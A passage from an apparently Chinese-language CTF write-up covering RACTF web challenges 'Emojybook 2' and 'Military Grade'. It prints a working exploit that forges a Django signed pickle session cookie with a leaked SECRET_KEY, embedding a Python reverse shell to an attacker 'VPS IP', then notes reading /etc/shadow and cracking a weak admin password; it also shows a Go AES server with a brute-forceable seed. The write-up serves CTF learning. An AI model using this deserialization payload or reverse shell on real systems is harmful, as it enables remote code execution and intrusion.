&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">thread_function&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">thread&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webemojybook-2">Web/Emojybook 2&lt;/h2>
&lt;blockquote>
&lt;p>no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>跟上面那个前端一模一样，然而这次再用之前的 &lt;code>{..{/flag.txt}..}&lt;/code>会返回500错误，这回就要用上之前完全没用到的pickle session cookie了。&lt;/p>
&lt;p>先读一下/app/notebook/settings.py，得到secret_key，然后搞一个反弹shell的cookie出来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/&lt;/span>
&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">django.core.signing&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">django.contrib.sessions.serializers&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.http&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.conf&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">settings&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7&amp;#34;(S3xv,{sp)Xaqg?2pj2=hFCgN&amp;#34;CR&amp;#34;UPn4&amp;#39;&lt;/span>
&lt;span style="color:#111">settings&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">configure&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">DEFAULT_HASHING_ALGORITHM&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sha256&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Initial cookie when visiting the page&lt;/span>
&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM&amp;#34;&lt;/span>
&lt;span style="color:#111">newContent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PickleRce&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#d88200">&amp;#34;python -c &amp;#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">VPS IP&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">/bin/sh&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;testcookie&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PickleRce&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">new_cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">compress&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># We can then make a request with this cookie&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:23934/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sessionid&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">new_cookie&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到shell之后我们只是个web用户，读/etc/shadow可以i得到admin的hash值，弱口令 是个999999，然后我们就可以&lt;code>su admin&lt;/code>，读flag了&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi_rce_not_unintended}&lt;/code>&lt;/p>
&lt;p>参考：&lt;a href="https://techsupportjosh.com/posts/ractf-emojibook/">wp&lt;/a>&lt;/p>
&lt;h2 id="webmilitary-grade">Web/Military Grade&lt;/h2>
&lt;blockquote>
&lt;p>Go is safe, right? That means my implementation of AES will be secure?&lt;/p>
&lt;/blockquote>
&lt;p>给出了go文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sync&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;time&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">rawFlag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;[REDACTED]&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flagmu&lt;/span> &lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Mutex&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">after&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">padding&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">padtext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Repeat&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">padtext&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bKey&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">bPlaintext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bKey&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCEncrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">EncodeToString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewTicker&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Millisecond&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">672&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">C&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Now&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">UnixNano&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">^&lt;/span>&lt;span style="color:#ae81ff">0x7FFFFFFFFEFFF000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rawFlag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Challenge starting up&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">go&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:80&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到flag被AES CBC加密，加密本身没问题，问题出在种子上；种子生成是靠&lt;code>rand.Seed(time.Now().UnixNano() &amp;amp; ^0x7FFFFFFFFEFFF000)&lt;/code>完成，这样得到的种子很小 可以被我们爆破出来&lt;/p>
&lt;p>exp.go&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
